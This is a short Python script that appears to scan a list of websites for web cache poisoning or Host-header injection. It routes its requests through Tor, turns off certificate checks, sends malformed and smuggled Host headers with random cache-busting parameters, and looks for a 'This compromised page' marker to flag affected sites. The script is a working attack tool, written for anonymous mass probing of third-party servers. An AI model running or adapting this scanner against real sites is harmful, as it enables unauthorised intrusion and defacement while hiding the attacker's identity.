import requests
import warnings
import random
from requests.packages.urllib3.exceptions import InsecureRequestWarning

warnings.simplefilter('ignore',InsecureRequestWarning)

regions = [" "]
proxies = {
    'http': 'socks5h://127.0.0.1:9050',
    'https': 'socks5h://127.0.0.1:9050'
}


urls = open("urllist.txt","r").read().strip().split("\n")

for url in urls:
    for region in regions:
        rand=random.randrange(1, 1000000, 1)
        req=requests.get(url+"/index.html?youcannotguessme"+str(rand)+"="+str(rand), headers={"\x1dHost":region,"%20Host":region,"Host": region+ "%40"+region}, verify=False, allow_redirects=False, proxies=proxies)
        if "<h1>This compromised page</h1>" in req.text:
            print(url, region)
